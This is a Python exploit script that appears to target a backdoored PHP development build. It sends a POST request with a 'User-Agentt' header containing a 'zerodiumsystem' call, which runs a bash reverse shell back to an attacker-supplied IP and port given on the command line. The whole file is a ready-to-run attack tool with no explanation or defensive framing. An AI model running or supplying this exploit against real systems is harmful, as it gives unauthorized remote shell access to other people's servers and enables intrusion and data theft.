#!/usr/bin/env python3

import argparse
import requests

def contact_target(target, attacker, port):
    content = str()
    full_url = str()
    message = str()
    success = bool()

    try:
        full_url = f"http://{target}/"
        backdoor = f"bash -c \"bash -i >& /dev/tcp/{attacker}/{port} 0>&1\""

        print(backdoor)

        headers = {
                "User-Agentt": f"zerodiumsystem('{backdoor}');"
        }

        print("[*] Sending Backdoor...")

        resp = requests.post(full_url, headers=headers)

        if resp.status_code != 200:
            raise ValueError(f"Bad Status Code ({resp.status_code} {resp.reason})")

        message = "Backdoor complete."
        success = True
    except Exception as ex:
        message = str(ex)
        success = False

    return (content, success, message)

def main():
    parser = argparse.ArgumentParser()

    parser.add_argument("target", help="IP address of target machine.", type=str)
    parser.add_argument("attacker", help="IP address of attack machine.", type=str)
    parser.add_argument("port", help="Port on attack machine.", type=int)

    args = parser.parse_args()

    target = args.target
    attacker = args.attacker
    port = args.port

    try:
        content, success, message = contact_target(target, attacker, port)

        if not(success):
            raise ValueError(message)

        print(content)

    except Exception as ex:
        print(f"[-] {ex}")

    return

if __name__ == "__main__":
    main()

